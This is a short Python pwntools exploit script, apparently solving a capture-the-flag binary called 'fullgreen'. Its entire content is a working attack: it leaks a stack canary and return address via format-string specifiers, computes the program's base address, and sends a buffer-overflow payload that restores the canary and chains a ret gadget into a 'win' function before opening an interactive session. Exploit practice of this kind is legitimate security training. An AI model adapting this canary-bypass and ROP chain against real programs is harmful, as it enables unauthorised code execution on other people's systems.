from pwn import *
context.arch = "amd64"
elf = ELF("./fullgreen")
p = process("./fullgreen")
p.sendline("%79$p")
resp = p.recv()
ret_addr = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
p.sendline("%71$p")
resp = p.recv()
can_addr = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
elf.address = ret_addr - elf.sym.main
rop_chain = ROP(elf)
payload = b''
payload += (0x210-8) * b"Z"
payload += p64(can_addr)
payload += 8 * b"Z"
payload += p64(rop_chain.find_gadget(['ret'])[0])
payload += p64(elf.sym.win)
p.sendline(payload)
p.interactive()

